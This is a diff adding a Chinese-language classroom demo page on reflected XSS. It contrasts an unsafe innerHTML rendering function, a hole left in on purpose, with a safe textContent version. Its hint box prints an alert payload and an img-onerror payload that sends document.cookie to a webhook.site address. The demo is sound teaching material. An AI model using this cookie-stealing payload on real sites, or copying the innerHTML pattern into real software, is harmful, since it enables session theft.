@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D3 - 基础 XSS 与 Cookie 窃取演示</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
+</head>
+<body class="container">
+    <hgroup>
+        <h2>🛡️ 实验 1：反射型 XSS 与 Cookie 窃取</h2>
+        <p>演示 <code>innerHTML</code> 的漏洞与 <code>textContent</code> 的防御机制。</p>
+    </hgroup>
+
+    <article>
+        <header>💡 提示：试着输入以下 Payload</header>
+        <p>基础弹窗：<code>&lt;script&gt;alert('你被攻击了')&lt;/script&gt;</code></p>
+        <p>窃取 Cookie（去 webhook.site 申请个链接替换进去）：<br>
+        <code>&lt;img src=x onerror="fetch('https://webhook.site/你的专属URL?cookie=' + document.cookie)"&gt;</code></p>
+    </article>
+
+    <label for="myInput">输入测试内容：</label>
+    <input type="text" id="myInput" placeholder="在这里输入恶意代码...">
+
+    <div class="grid">
+        <button onclick="testUnsafe()" class="contrast" style="background-color: #e74c3c; border-color: #e74c3c;">⚠️ 漏洞模式（直接执行）</button>
+        <button onclick="testSafe()" style="background-color: #2ecc71; border-color: #2ecc71;">✅ 防御模式（转义显示）</button>
+    </div>
+
+    <h3>结果显示区：</h3>
+    <article id="resultBox" style="min-height: 100px;">
+        等待输入...
+    </article>
+
+    <script>
+        // 模拟用户登录，给浏览器种下 Cookie
+        document.cookie = "user_token=secret_123456; path=/";
+
+        function testUnsafe() {
+            let text = document.getElementById("myInput").value;
+            // ⚠️ 漏洞点：innerHTML 会将字符串当做 HTML 解析并执行
+            document.getElementById("resultBox").innerHTML = text;
+        }
+
+        function testSafe() {
+            let text = document.getElementById("myInput").value;
+            // ✅ 防御点：textContent 会将字符串全部当做普通文本处理
+            document.getElementById("resultBox").textContent = text;
+        }
+    </script>
+</body>
+</html>
